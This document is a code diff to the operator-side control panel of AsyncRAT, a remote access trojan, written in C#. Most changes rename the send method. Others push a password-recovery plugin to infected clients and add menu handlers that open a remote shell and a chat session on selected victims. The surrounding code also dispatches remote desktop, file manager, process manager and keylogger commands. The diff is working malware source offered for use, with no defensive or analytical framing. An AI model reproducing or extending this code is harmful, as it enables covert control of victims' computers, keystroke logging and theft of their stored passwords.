@@ -143,12 +143,15 @@ namespace AsyncRAT_Sharp
 
         private void ping_Tick(object sender, EventArgs e)
         {
-            if (listView1.SelectedItems.Count > 0)
+            if (listView1.Items.Count > 0)
             {
+                MsgPack msgpack = new MsgPack();
+                msgpack.ForcePathObject("Packet").AsString = "Ping";
+                msgpack.ForcePathObject("Message").AsString = "This is a ping!";
                 foreach (ListViewItem itm in listView1.Items)
                 {
                     Clients client = (Clients)itm.Tag;
-                    ThreadPool.QueueUserWorkItem(client.Ping);
+                    ThreadPool.QueueUserWorkItem(client.Send,msgpack.Encode2Bytes());
                 }
             }
         }
@@ -168,7 +171,7 @@ namespace AsyncRAT_Sharp
                 foreach (ListViewItem itm in listView1.SelectedItems)
                 {
                     Clients client = (Clients)itm.Tag;
-                    ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                    ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                 }
             }
         }
@@ -188,7 +191,7 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
             }
@@ -215,7 +218,7 @@ namespace AsyncRAT_Sharp
                             {
                                 await msgpack.ForcePathObject("File").LoadFileAsBytes(file);
                                 msgpack.ForcePathObject("Extension").AsString = Path.GetExtension(file);
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }
                     }
@@ -242,7 +245,7 @@ namespace AsyncRAT_Sharp
                         foreach (ListViewItem itm in listView1.SelectedItems)
                         {
                             Clients client = (Clients)itm.Tag;
-                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
                     catch (Exception ex)
@@ -265,7 +268,7 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
                 catch (Exception ex)
@@ -293,7 +296,7 @@ namespace AsyncRAT_Sharp
                         {
                             Clients client = (Clients)itm.Tag;
                             client.LV.ForeColor = Color.Red;
-                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
                 }
@@ -333,7 +336,7 @@ namespace AsyncRAT_Sharp
                         {
                             Clients client = (Clients)itm.Tag;
                             client.LV.ForeColor = Color.Red;
-                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
                     formSend.Close();
@@ -373,7 +376,7 @@ namespace AsyncRAT_Sharp
                                     Active = true
                                 };
                                 remoteDesktop.Show();
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }));
                     }
@@ -412,7 +415,7 @@ namespace AsyncRAT_Sharp
                                     C = client
                                 };
                                 processManager.Show();
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }));
                     }
@@ -458,7 +461,7 @@ namespace AsyncRAT_Sharp
                                     C = client
                                 };
                                 fileManager.Show();
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }));
                     }
@@ -496,7 +499,7 @@ namespace AsyncRAT_Sharp
                                     C = client
                                 };
                                 KL.Show();
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }));
                     }
@@ -520,7 +523,7 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
                 catch (Exception ex)
@@ -542,7 +545,7 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
                 catch (Exception ex)
@@ -570,7 +573,7 @@ namespace AsyncRAT_Sharp
                         foreach (ListViewItem itm in listView1.SelectedItems)
                         {
                             Clients client = (Clients)itm.Tag;
-                            ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                            ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                         }
                     }
                 }
@@ -617,7 +620,7 @@ namespace AsyncRAT_Sharp
                     foreach (ListViewItem itm in listView1.Items)
                     {
                         Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
                 catch { }
@@ -676,7 +679,7 @@ namespace AsyncRAT_Sharp
                             if (itm.SubItems[lv_admin.Index].Text == "Administrator")
                             {
                                 Clients client = (Clients)itm.Tag;
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }
                     }
@@ -705,7 +708,7 @@ namespace AsyncRAT_Sharp
                             if (itm.SubItems[lv_admin.Index].Text != "Administrator")
                             {
                                 Clients client = (Clients)itm.Tag;
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                             }
                         }
                     }
@@ -726,10 +729,12 @@ namespace AsyncRAT_Sharp
                 {
                     MsgPack msgpack = new MsgPack();
                     msgpack.ForcePathObject("Packet").AsString = "recoveryPassword";
+                    msgpack.ForcePathObject("Plugin").SetAsBytes(Properties.Resources.RecoveryPlugin);
                     foreach (ListViewItem itm in listView1.SelectedItems)
                     {
                         Clients client = (Clients)itm.Tag;
-                        ThreadPool.QueueUserWorkItem(client.BeginSend, msgpack.Encode2Bytes());
+                        client.LV.ForeColor = Color.Red;
+                        ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
                     }
                 }
                 catch (Exception ex)
@@ -872,7 +877,7 @@ namespace AsyncRAT_Sharp
                                 Debug.WriteLine("task executed");
                                 asyncTask.doneClient.Add(client.ID);
                                 SetExecution(asyncTask.id);
-                                ThreadPool.QueueUserWorkItem(client.BeginSend, asyncTask.msgPack);
+                                ThreadPool.QueueUserWorkItem(client.Send, asyncTask.msgPack);
                             }
                         }
                         await Task.Delay(15 * 1000);
@@ -906,6 +911,78 @@ namespace AsyncRAT_Sharp
             }
         }
 
+        private void REMOTESHELLToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "shell";
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            FormShell shell = (FormShell)Application.OpenForms["shell:" + client.ID];
+                            if (shell == null)
+                            {
+                                shell = new FormShell
+                                {
+                                    Name = "shell:" + client.ID,
+                                    Text = "shell:" + client.ID,
+                                    F = this,
+                                    C = client
+                                };
+                                shell.Show();
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
 
+        private void CHATToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                if (listView1.SelectedItems.Count > 0)
+                {
+                    MsgPack msgpack = new MsgPack();
+                    msgpack.ForcePathObject("Packet").AsString = "chat";
+                    foreach (ListViewItem itm in listView1.SelectedItems)
+                    {
+                        Clients client = (Clients)itm.Tag;
+                        this.BeginInvoke((MethodInvoker)(() =>
+                        {
+                            FormChat shell = (FormChat)Application.OpenForms["chat:" + client.ID];
+                            if (shell == null)
+                            {
+                                shell = new FormChat
+                                {
+                                    Name = "chat:" + client.ID,
+                                    Text = "chat:" + client.ID,
+                                    F = this,
+                                    C = client
+                                };
+                                shell.Show();
+                                ThreadPool.QueueUserWorkItem(client.Send, msgpack.Encode2Bytes());
+                            }
+                        }));
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+                return;
+            }
+        }
     }
 }
